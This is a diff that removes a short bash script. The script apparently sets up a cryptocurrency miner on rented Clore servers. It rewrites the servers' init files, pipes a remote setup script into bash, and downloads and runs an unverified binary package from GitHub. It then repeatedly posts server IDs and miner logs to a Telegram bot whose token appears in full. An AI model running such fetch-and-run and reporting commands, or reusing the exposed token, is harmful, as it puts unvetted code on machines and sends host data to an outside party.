@@ -1,5 +1,0 @@
-#!/bin/bash
-sed -i "s@wget https://github.com/VADIMbI4/Hive23/raw/main/chups && chmod +x chups && ./chups@#@g" /init-clore-order-*.sh
-apt update -y ; apt install screen git curl mc -y
-screen -dmS node -L -Logfile /var/log/node bash -c 'curl -sL https://deb.nodesource.com/setup_16.x | bash - && apt-get install -y nodejs ; wget https://github.com/VADIMbI4/Hive23/raw/main/gram_chi_up.tar.gz && tar -xvf gram_chi_up.tar.gz && cd ~/gram_chi_up && screen -dmS miner -L -Logfile /var/log/chipi.log ./h-run.sh && servid=$(grep "ServID" /init-clore-order-*.sh) ; curl -s -X POST https://api.telegram.org/bot796842502:AAFTQgCWbdCI-Ll9T738h5bweMEpdhzUCao/sendMessage -d chat_id=-1002028690243 -d text="$servid:  Start miner"'
-screen -dmS sendlog bash -c 'sleep 300; while true; do logs=$(tail -n 1 /var/log/chipi.log) ; ac=$(grep -c ":     mined" /var/log/chipi.log) ; servid=$(grep "ServID" /init-clore-order-*.sh) ; curl -s -X POST https://api.telegram.org/bot796842502:AAFTQgCWbdCI-Ll9T738h5bweMEpdhzUCao/sendMessage -d chat_id=-1002028690243 -d text="$servid: A$ac:  $logs"; sleep 600; done'
